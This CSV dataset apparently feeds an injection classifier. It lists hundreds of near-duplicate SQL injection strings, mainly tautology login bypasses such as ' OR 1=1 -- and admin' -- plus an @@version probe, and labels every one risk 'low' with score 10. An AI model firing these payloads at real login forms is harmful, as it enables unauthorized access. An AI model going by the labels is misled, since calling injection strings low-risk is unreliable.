query,risk,score
' or 'a'='a -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' OR '1'='1 -- ,low,10
""" OR ""1""=""1 # b",low,10
' OR 1=1 LIMIT 1 -- # q,low,10
1' OR '1'='1 # p,low,10
1' or true -- # 3,low,10
1' or true -- -- ,low,10
1' OR '1'='1 -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' /**/ # h,low,10
1' or '1'='1 # r,low,10
' OR 'x'='x # y,low,10
' OR 'x'='x -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' /**/ # r,low,10
' OR 'x'='x # m,low,10
' or 'a'='a # r,low,10
admin' -- -- ,low,10
admin' -- # g,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1=1 LIMIT 1 -- # n,low,10
' || 1=1 -- -- ,low,10
1' OR '1'='1 -- ,low,10
' OR 'a'='a # j,low,10
' or 'a'='a # e,low,10
' or 'a'='a -- ,low,10
admin' /**/ -- ,low,10
' OR 1=1 -- -- ,low,10
admin' -- # 0,low,10
1' or true -- -- ,low,10
' or 'a'='a -- ,low,10
admin' -- # y,low,10
admin' /**/ -- ,low,10
admin' /**/ -- ,low,10
admin' /**/ # e,low,10
' OR 1=1 -- # a,low,10
admin' /**/ -- ,low,10
1' or 1=1 -- -- ,low,10
admin' -- # o,low,10
1' OR '1'='1 -- ,low,10
1' or '1'='1 # d,low,10
1' OR '1'='1 -- ,low,10
1' or true -- -- ,low,10
' OR 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
admin' -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' || 1=1 -- # a,low,10
""" OR ""1""=""1 # b",low,10
' OR 'x'='x -- ,low,10
' || 1=1 -- -- ,low,10
' OR 'x'='x -- ,low,10
admin' -- # f,low,10
1' or true -- # d,low,10
admin' -- -- ,low,10
' || 1=1 -- -- ,low,10
admin' /**/ # k,low,10
""" OR ""1""=""1 # 6",low,10
' OR 'a'='a # g,low,10
""" OR ""1""=""1 -- ",low,10
admin' -- # p,low,10
admin' -- # l,low,10
""" OR ""1""=""1 # n",low,10
' OR 1=1 -- -- ,low,10
admin' -- # w,low,10
1' OR '1'='1 -- ,low,10
admin' -- # p,low,10
1' or '1'='1 # t,low,10
' OR 1 IN (SELECT @@version) -- # e,low,10
' OR 'x'='x # 4,low,10
' OR 'x'='x -- ,low,10
admin' -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
1' or 1=1 -- -- ,low,10
""" OR ""1""=""1 # z",low,10
' || 1=1 -- # e,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # l,low,10
' OR 1=1 -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
1' OR '1'='1 -- ,low,10
' || 1=1 -- -- ,low,10
1' OR '1'='1 # k,low,10
1' or '1'='1 # l,low,10
1' or '1'='1 -- ,low,10
1' OR '1'='1 # f,low,10
' OR 1=1 LIMIT 1 -- # 4,low,10
' OR 1 IN (SELECT @@version) -- # q,low,10
' OR 1=1 -- # q,low,10
1' OR '1'='1 -- ,low,10
' OR 'x'='x # 4,low,10
' OR 1=1 -- # 7,low,10
1' or '1'='1 # r,low,10
' || 1=1 -- # d,low,10
1' or true -- # l,low,10
' OR 1=1 -- -- ,low,10
' OR 1=1 -- # 6,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' or 'a'='a # p,low,10
1' OR '1'='1 # p,low,10
' OR 'a'='a # u,low,10
' OR 1 IN (SELECT @@version) -- # 1,low,10
1' or '1'='1 # b,low,10
' || 1=1 -- # 0,low,10
1' or 1=1 -- # q,low,10
1' OR '1'='1 -- ,low,10
admin' /**/ -- ,low,10
' OR 1 IN (SELECT @@version) -- # a,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' || 1=1 -- # t,low,10
' OR 'a'='a # p,low,10
admin' /**/ # 5,low,10
1' OR '1'='1 # 6,low,10
' OR 'a'='a # y,low,10
' or 'a'='a -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # x,low,10
' OR 1=1 LIMIT 1 -- # a,low,10
' OR 1=1 -- -- ,low,10
' OR 'x'='x # f,low,10
1' or 1=1 -- # f,low,10
' OR 1=1 LIMIT 1 -- # w,low,10
1' OR '1'='1 -- ,low,10
' || 1=1 -- # a,low,10
admin' -- # n,low,10
1' or true -- -- ,low,10
admin' -- -- ,low,10
' OR 'x'='x -- ,low,10
1' or 1=1 -- # e,low,10
admin' -- # o,low,10
' OR 'a'='a -- ,low,10
' OR 'x'='x -- ,low,10
1' or '1'='1 -- ,low,10
admin' -- -- ,low,10
' || 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # g,low,10
' OR 'x'='x -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' or '1'='1 -- ,low,10
admin' -- # n,low,10
admin' -- -- ,low,10
1' or 1=1 -- -- ,low,10
1' or true -- # b,low,10
admin' -- # q,low,10
1' or 1=1 -- -- ,low,10
admin' /**/ -- ,low,10
""" OR ""1""=""1 -- ",low,10
' or 'a'='a -- ,low,10
admin' -- -- ,low,10
admin' -- # p,low,10
' OR 'x'='x -- ,low,10
1' or true -- # g,low,10
1' OR '1'='1 -- ,low,10
1' or 1=1 -- # p,low,10
' OR 1 IN (SELECT @@version) -- # j,low,10
' || 1=1 -- -- ,low,10
1' or 1=1 -- # b,low,10
1' or 1=1 -- # g,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
1' or 1=1 -- # 4,low,10
' OR 'a'='a # g,low,10
' OR 'a'='a -- ,low,10
' OR 1 IN (SELECT @@version) -- # g,low,10
1' OR '1'='1 -- ,low,10
' OR 1 IN (SELECT @@version) -- # 8,low,10
' OR 1=1 -- # c,low,10
' OR 'a'='a -- ,low,10
' || 1=1 -- # u,low,10
admin' /**/ -- ,low,10
' || 1=1 -- # o,low,10
' OR 'x'='x # w,low,10
1' or 1=1 -- # u,low,10
' OR 'x'='x # q,low,10
1' or true -- # e,low,10
' OR 'a'='a # j,low,10
1' or true -- -- ,low,10
' OR 'a'='a -- ,low,10
1' or true -- # 1,low,10
1' or true -- # k,low,10
admin' /**/ -- ,low,10
' OR 1=1 -- # v,low,10
1' or true -- -- ,low,10
' OR 'x'='x -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
admin' /**/ -- ,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 -- # s,low,10
' OR 1=1 -- -- ,low,10
admin' /**/ # s,low,10
' OR 'a'='a -- ,low,10
' || 1=1 -- # z,low,10
admin' /**/ -- ,low,10
admin' /**/ -- ,low,10
1' or '1'='1 -- ,low,10
1' or 1=1 -- # x,low,10
' OR 1 IN (SELECT @@version) -- # 2,low,10
' OR 1 IN (SELECT @@version) -- # t,low,10
' OR 'a'='a # 7,low,10
1' or 1=1 -- -- ,low,10
admin' -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' || 1=1 -- -- ,low,10
1' or '1'='1 -- ,low,10
""" OR ""1""=""1 # z",low,10
1' or 1=1 -- # p,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' /**/ -- ,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 'a'='a # r,low,10
1' or '1'='1 -- ,low,10
' OR 1=1 LIMIT 1 -- # m,low,10
1' OR '1'='1 # 3,low,10
1' or '1'='1 # g,low,10
admin' -- # y,low,10
admin' -- # y,low,10
1' or '1'='1 # n,low,10
' OR 'x'='x -- ,low,10
' OR 'x'='x -- ,low,10
' OR 'x'='x # o,low,10
' OR 1=1 LIMIT 1 -- # b,low,10
' OR 'a'='a # z,low,10
1' OR '1'='1 # 7,low,10
""" OR ""1""=""1 -- ",low,10
' OR 'x'='x # h,low,10
1' or 1=1 -- # c,low,10
admin' /**/ # 3,low,10
' OR 'a'='a -- ,low,10
1' or 1=1 -- -- ,low,10
1' or 1=1 -- # 8,low,10
1' OR '1'='1 -- ,low,10
' OR 1=1 -- # 4,low,10
' OR 'a'='a # 3,low,10
admin' -- -- ,low,10
' || 1=1 -- -- ,low,10
1' OR '1'='1 -- ,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
1' or true -- -- ,low,10
admin' -- -- ,low,10
' or 'a'='a # n,low,10
' || 1=1 -- # t,low,10
' OR 1 IN (SELECT @@version) -- # c,low,10
' or 'a'='a -- ,low,10
1' or true -- -- ,low,10
' OR 'x'='x -- ,low,10
' OR 'x'='x # k,low,10
1' or true -- # b,low,10
""" OR ""1""=""1 -- ",low,10
' or 'a'='a # m,low,10
1' or true -- -- ,low,10
1' or '1'='1 -- ,low,10
' OR 'a'='a # 8,low,10
""" OR ""1""=""1 -- ",low,10
admin' /**/ -- ,low,10
1' or '1'='1 # 0,low,10
1' OR '1'='1 -- ,low,10
' || 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' or 1=1 -- -- ,low,10
' or 'a'='a # b,low,10
admin' /**/ -- ,low,10
1' or '1'='1 # 4,low,10
admin' -- -- ,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 -- -- ,low,10
admin' /**/ # y,low,10
1' OR '1'='1 -- ,low,10
' OR 'x'='x # o,low,10
1' OR '1'='1 -- ,low,10
1' OR '1'='1 # d,low,10
' OR 1 IN (SELECT @@version) -- # r,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- # 9,low,10
admin' -- -- ,low,10
admin' /**/ # o,low,10
1' or '1'='1 # n,low,10
' OR 'a'='a # p,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
1' or 1=1 -- # m,low,10
' OR 1=1 -- # 2,low,10
1' OR '1'='1 # c,low,10
1' or '1'='1 # 1,low,10
' or 'a'='a -- ,low,10
1' or '1'='1 # b,low,10
1' or true -- # c,low,10
admin' /**/ -- ,low,10
1' or '1'='1 -- ,low,10
' OR 1=1 -- # n,low,10
admin' -- # r,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1=1 LIMIT 1 -- # v,low,10
1' or '1'='1 # a,low,10
1' or '1'='1 -- ,low,10
1' or 1=1 -- # p,low,10
""" OR ""1""=""1 -- ",low,10
1' OR '1'='1 # 0,low,10
1' OR '1'='1 -- ,low,10
' || 1=1 -- -- ,low,10
' OR 'a'='a -- ,low,10
1' or true -- -- ,low,10
1' or true -- # 7,low,10
admin' /**/ # v,low,10
' OR 1 IN (SELECT @@version) -- # a,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
admin' -- -- ,low,10
admin' /**/ # f,low,10
1' or '1'='1 # z,low,10
1' OR '1'='1 -- ,low,10
1' or true -- -- ,low,10
' OR 1=1 -- -- ,low,10
admin' -- # 3,low,10
admin' -- # n,low,10
' || 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
' or 'a'='a # a,low,10
1' or '1'='1 # p,low,10
admin' -- # k,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 'a'='a # y,low,10
' OR 'x'='x -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' or true -- -- ,low,10
' OR 1=1 -- # z,low,10
admin' -- # j,low,10
1' OR '1'='1 -- ,low,10
' or 'a'='a -- ,low,10
' or 'a'='a # 3,low,10
admin' -- # c,low,10
1' or '1'='1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 1=1 -- # p,low,10
' OR 'x'='x -- ,low,10
1' or '1'='1 -- ,low,10
' OR 1=1 -- -- ,low,10
admin' -- # h,low,10
admin' /**/ -- ,low,10
' OR 'x'='x # 7,low,10
' OR 'a'='a -- ,low,10
admin' /**/ -- ,low,10
""" OR ""1""=""1 # c",low,10
1' OR '1'='1 # 2,low,10
admin' -- # x,low,10
' OR 'x'='x # r,low,10
' OR 'x'='x # l,low,10
1' or 1=1 -- # d,low,10
admin' /**/ -- ,low,10
' OR 1=1 -- # h,low,10
1' or '1'='1 # 5,low,10
' or 'a'='a -- ,low,10
' || 1=1 -- # r,low,10
' OR 'a'='a -- ,low,10
' OR 'a'='a # t,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' or true -- # 3,low,10
' OR 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1=1 LIMIT 1 -- # r,low,10
admin' -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # o,low,10
' OR 1=1 LIMIT 1 -- # 6,low,10
admin' -- -- ,low,10
1' OR '1'='1 -- ,low,10
1' or true -- -- ,low,10
1' or '1'='1 -- ,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 -- -- ,low,10
' or 'a'='a # 9,low,10
1' or 1=1 -- # o,low,10
' OR 'x'='x -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' -- # v,low,10
1' OR '1'='1 -- ,low,10
' OR 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' /**/ # 3,low,10
""" OR ""1""=""1 # v",low,10
' OR 'a'='a # y,low,10
' OR 1=1 -- -- ,low,10
' OR 1=1 -- -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 'x'='x # f,low,10
1' or '1'='1 -- ,low,10
""" OR ""1""=""1 # w",low,10
' OR 'a'='a -- ,low,10
admin' -- -- ,low,10
1' or '1'='1 -- ,low,10
1' or 1=1 -- -- ,low,10
admin' -- # n,low,10
1' or 1=1 -- # s,low,10
' OR 1=1 -- # d,low,10
' OR 'x'='x -- ,low,10
admin' -- -- ,low,10
' OR 'x'='x -- ,low,10
' OR 'x'='x # 4,low,10
1' OR '1'='1 -- ,low,10
' OR 1=1 LIMIT 1 -- # n,low,10
' or 'a'='a -- ,low,10
' or 'a'='a -- ,low,10
' || 1=1 -- -- ,low,10
admin' -- -- ,low,10
admin' -- # m,low,10
' OR 'x'='x # 8,low,10
' || 1=1 -- # l,low,10
1' or '1'='1 -- ,low,10
1' or '1'='1 # l,low,10
admin' -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' OR 'x'='x -- ,low,10
1' OR '1'='1 -- ,low,10
1' or '1'='1 # 1,low,10
' || 1=1 -- # u,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' or 'a'='a # 4,low,10
1' or true -- # h,low,10
' or 'a'='a -- ,low,10
1' or 1=1 -- # k,low,10
1' or true -- # i,low,10
""" OR ""1""=""1 -- ",low,10
1' or true -- # j,low,10
1' or true -- -- ,low,10
' OR 'x'='x -- ,low,10
' || 1=1 -- # u,low,10
""" OR ""1""=""1 -- ",low,10
1' or '1'='1 -- ,low,10
1' OR '1'='1 -- ,low,10
' or 'a'='a # 0,low,10
' OR 'a'='a -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 'x'='x -- ,low,10
admin' -- # b,low,10
1' OR '1'='1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' -- # l,low,10
admin' -- # 7,low,10
' OR 1=1 LIMIT 1 -- # t,low,10
' OR 'a'='a -- ,low,10
' or 'a'='a -- ,low,10
admin' /**/ # f,low,10
1' or 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- # j,low,10
admin' -- -- ,low,10
' OR 'a'='a # y,low,10
admin' -- # v,low,10
admin' -- # p,low,10
1' or true -- -- ,low,10
1' or true -- # 2,low,10
admin' -- -- ,low,10
admin' /**/ -- ,low,10
' || 1=1 -- # 0,low,10
admin' -- # c,low,10
admin' /**/ -- ,low,10
admin' -- # 3,low,10
1' or 1=1 -- # r,low,10
1' or true -- -- ,low,10
admin' -- # b,low,10
admin' /**/ -- ,low,10
admin' -- -- ,low,10
1' or '1'='1 -- ,low,10
1' or true -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
admin' -- -- ,low,10
' OR 'x'='x -- ,low,10
""" OR ""1""=""1 # 0",low,10
1' or '1'='1 # u,low,10
""" OR ""1""=""1 -- ",low,10
' or 'a'='a -- ,low,10
admin' -- -- ,low,10
' OR 1=1 -- # 3,low,10
admin' /**/ -- ,low,10
admin' /**/ -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # d,low,10
' || 1=1 -- # 0,low,10
' OR 1=1 -- -- ,low,10
admin' -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 1=1 -- -- ,low,10
' || 1=1 -- # y,low,10
admin' -- # c,low,10
admin' -- -- ,low,10
admin' -- # c,low,10
1' OR '1'='1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # p,low,10
1' OR '1'='1 -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
' OR 'a'='a -- ,low,10
' OR 'x'='x -- ,low,10
admin' /**/ # c,low,10
' or 'a'='a -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
admin' -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1 IN (SELECT @@version) -- # k,low,10
' OR 'x'='x -- ,low,10
' OR 'a'='a -- ,low,10
' OR 'x'='x -- ,low,10
admin' -- # m,low,10
' or 'a'='a -- ,low,10
1' OR '1'='1 # w,low,10
' || 1=1 -- # b,low,10
' || 1=1 -- -- ,low,10
' OR 'a'='a # b,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' or '1'='1 -- ,low,10
1' OR '1'='1 -- ,low,10
admin' /**/ -- ,low,10
admin' -- -- ,low,10
1' or '1'='1 # a,low,10
' || 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' || 1=1 -- # u,low,10
admin' /**/ -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1=1 -- -- ,low,10
admin' /**/ -- ,low,10
1' or '1'='1 # 6,low,10
""" OR ""1""=""1 -- ",low,10
1' OR '1'='1 # n,low,10
1' or true -- -- ,low,10
1' or '1'='1 -- ,low,10
1' or 1=1 -- # o,low,10
1' or 1=1 -- -- ,low,10
admin' -- -- ,low,10
1' or true -- -- ,low,10
' || 1=1 -- -- ,low,10
' || 1=1 -- # v,low,10
1' or true -- # p,low,10
""" OR ""1""=""1 # 0",low,10
' OR 'x'='x # p,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' or 'a'='a # x,low,10
1' or '1'='1 -- ,low,10
' OR 1 IN (SELECT @@version) -- # u,low,10
' OR 1=1 LIMIT 1 -- # d,low,10
admin' -- # q,low,10
' OR 'x'='x -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
admin' -- -- ,low,10
1' OR '1'='1 -- ,low,10
' OR 'a'='a # k,low,10
' OR 1=1 -- # l,low,10
1' OR '1'='1 # 7,low,10
1' or 1=1 -- # a,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1=1 LIMIT 1 -- # k,low,10
' OR 'x'='x # 4,low,10
admin' /**/ -- ,low,10
admin' /**/ -- ,low,10
' OR 1=1 -- # g,low,10
' || 1=1 -- -- ,low,10
admin' -- # i,low,10
1' OR '1'='1 # 8,low,10
' OR 'a'='a -- ,low,10
admin' -- -- ,low,10
admin' -- -- ,low,10
' OR 'x'='x -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
admin' -- # 7,low,10
' OR 'a'='a # m,low,10
1' or 1=1 -- # i,low,10
' or 'a'='a # m,low,10
1' or '1'='1 -- ,low,10
' OR 1=1 LIMIT 1 -- # 3,low,10
admin' -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 'a'='a -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' -- # v,low,10
admin' -- # l,low,10
' || 1=1 -- # 5,low,10
1' or '1'='1 -- ,low,10
1' or '1'='1 # 2,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' or 1=1 -- -- ,low,10
admin' -- # l,low,10
' OR 'a'='a -- ,low,10
1' or true -- # d,low,10
admin' /**/ -- ,low,10
1' OR '1'='1 # e,low,10
1' OR '1'='1 # 6,low,10
' OR 'a'='a # j,low,10
admin' -- -- ,low,10
' OR 'x'='x # h,low,10
admin' -- -- ,low,10
' OR 1=1 LIMIT 1 -- # t,low,10
' OR 1 IN (SELECT @@version) -- # 5,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' or '1'='1 -- ,low,10
admin' -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' OR 'a'='a # 7,low,10
' OR 1 IN (SELECT @@version) -- # q,low,10
' or 'a'='a -- ,low,10
1' OR '1'='1 # i,low,10
1' or true -- # u,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 1=1 -- -- ,low,10
' OR 'a'='a -- ,low,10
admin' /**/ # j,low,10
' or 'a'='a # c,low,10
1' or '1'='1 -- ,low,10
' OR 1=1 -- -- ,low,10
' OR 'a'='a -- ,low,10
""" OR ""1""=""1 # 4",low,10
admin' /**/ # m,low,10
admin' /**/ # s,low,10
1' OR '1'='1 -- ,low,10
' || 1=1 -- # v,low,10
' OR 'a'='a # 0,low,10
1' or '1'='1 # s,low,10
1' or '1'='1 # w,low,10
1' or '1'='1 # w,low,10
1' or 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
' OR 'a'='a -- ,low,10
1' or 1=1 -- # z,low,10
' || 1=1 -- # q,low,10
' || 1=1 -- # f,low,10
' OR 'a'='a -- ,low,10
1' or 1=1 -- -- ,low,10
admin' -- # g,low,10
' OR 1=1 -- -- ,low,10
1' OR '1'='1 -- ,low,10
' OR 'a'='a # 5,low,10
admin' -- # y,low,10
1' or '1'='1 # h,low,10
""" OR ""1""=""1 # 4",low,10
' || 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # j,low,10
' || 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # v,low,10
' OR 'x'='x -- ,low,10
' or 'a'='a # v,low,10
admin' -- # x,low,10
1' or true -- -- ,low,10
' OR 1=1 -- -- ,low,10
admin' -- -- ,low,10
' || 1=1 -- # d,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' || 1=1 -- -- ,low,10
""" OR ""1""=""1 # 1",low,10
1' or true -- -- ,low,10
' OR 'x'='x -- ,low,10
admin' -- # p,low,10
admin' -- -- ,low,10
' or 'a'='a -- ,low,10
' OR 1 IN (SELECT @@version) -- # 9,low,10
' or 'a'='a -- ,low,10
' or 'a'='a # g,low,10
' or 'a'='a -- ,low,10
1' or '1'='1 # n,low,10
admin' /**/ # p,low,10
1' or true -- -- ,low,10
1' or 1=1 -- # m,low,10
' OR 'a'='a # w,low,10
' OR 1=1 -- # j,low,10
1' or 1=1 -- # c,low,10
' OR 'a'='a # p,low,10
admin' /**/ -- ,low,10
' OR 1 IN (SELECT @@version) -- # 1,low,10
admin' -- # 2,low,10
' OR 1=1 LIMIT 1 -- # d,low,10
' OR 1=1 -- # 2,low,10
""" OR ""1""=""1 # r",low,10
admin' -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
1' or '1'='1 -- ,low,10
admin' /**/ -- ,low,10
' OR 1=1 LIMIT 1 -- # 6,low,10
' || 1=1 -- -- ,low,10
admin' /**/ -- ,low,10
' || 1=1 -- -- ,low,10
' OR 'a'='a -- ,low,10
admin' /**/ -- ,low,10
' OR 1=1 LIMIT 1 -- # y,low,10
' or 'a'='a -- ,low,10
1' OR '1'='1 # m,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
1' or '1'='1 -- ,low,10
' or 'a'='a # l,low,10
admin' -- # e,low,10
' OR 1 IN (SELECT @@version) -- # s,low,10
' OR 'a'='a -- ,low,10
' OR 1=1 -- -- ,low,10
1' or 1=1 -- # k,low,10
1' OR '1'='1 # 0,low,10
1' or 1=1 -- # k,low,10
""" OR ""1""=""1 # u",low,10
' or 'a'='a -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
""" OR ""1""=""1 # x",low,10
1' or true -- # v,low,10
""" OR ""1""=""1 -- ",low,10
' || 1=1 -- -- ,low,10
' or 'a'='a # t,low,10
' OR 'a'='a # x,low,10
""" OR ""1""=""1 -- ",low,10
1' or '1'='1 # 9,low,10
1' or true -- # 5,low,10
' or 'a'='a # n,low,10
1' or '1'='1 # m,low,10
' OR 'x'='x # 8,low,10
1' OR '1'='1 # r,low,10
' || 1=1 -- -- ,low,10
1' or '1'='1 # w,low,10
1' OR '1'='1 # q,low,10
1' OR '1'='1 # q,low,10
' || 1=1 -- -- ,low,10
' or 'a'='a # s,low,10
' or 'a'='a # 9,low,10
admin' -- -- ,low,10
1' or '1'='1 # w,low,10
admin' -- # x,low,10
1' or '1'='1 # o,low,10
admin' -- # d,low,10
admin' -- -- ,low,10
' || 1=1 -- # p,low,10
admin' -- -- ,low,10
' OR 1=1 -- # y,low,10
1' or 1=1 -- # a,low,10
' || 1=1 -- # k,low,10
' || 1=1 -- # z,low,10
admin' -- -- ,low,10
' || 1=1 -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' OR 'x'='x # i,low,10
' || 1=1 -- -- ,low,10
' OR 'x'='x # v,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 'a'='a # a,low,10
' OR 'a'='a # k,low,10
1' OR '1'='1 # k,low,10
1' or true -- -- ,low,10
admin' -- # 6,low,10
' OR 1=1 LIMIT 1 -- # h,low,10
1' or '1'='1 -- ,low,10
' OR 'a'='a -- ,low,10
' OR 1=1 LIMIT 1 -- # n,low,10
1' or true -- -- ,low,10
' OR 'a'='a # l,low,10
1' or true -- # f,low,10
admin' -- # s,low,10
1' or '1'='1 -- ,low,10
' OR 'a'='a # f,low,10
1' or '1'='1 -- ,low,10
1' or true -- -- ,low,10
""" OR ""1""=""1 # z",low,10
' || 1=1 -- # 2,low,10
' OR 'a'='a # 9,low,10
admin' -- -- ,low,10
' OR 'a'='a # i,low,10
admin' /**/ -- ,low,10
""" OR ""1""=""1 # g",low,10
admin' /**/ -- ,low,10
admin' /**/ # b,low,10
' OR 'a'='a -- ,low,10
' || 1=1 -- # i,low,10
1' or true -- # l,low,10
' OR 1=1 LIMIT 1 -- # 8,low,10
1' or '1'='1 # f,low,10
' || 1=1 -- -- ,low,10
admin' -- -- ,low,10
admin' /**/ -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' OR '1'='1 # y,low,10
' OR 1=1 LIMIT 1 -- # 3,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 -- -- ,low,10
' || 1=1 -- # g,low,10
' or 'a'='a # a,low,10
1' or 1=1 -- # e,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 'x'='x # w,low,10
""" OR ""1""=""1 # 7",low,10
admin' /**/ # 7,low,10
' OR 'x'='x -- ,low,10
1' or true -- # t,low,10
admin' -- # n,low,10
' or 'a'='a # 6,low,10
admin' /**/ -- ,low,10
1' or '1'='1 -- ,low,10
' OR 1=1 LIMIT 1 -- # d,low,10
' OR 1=1 -- # 9,low,10
' or 'a'='a -- ,low,10
' OR 'a'='a # p,low,10
1' OR '1'='1 -- ,low,10
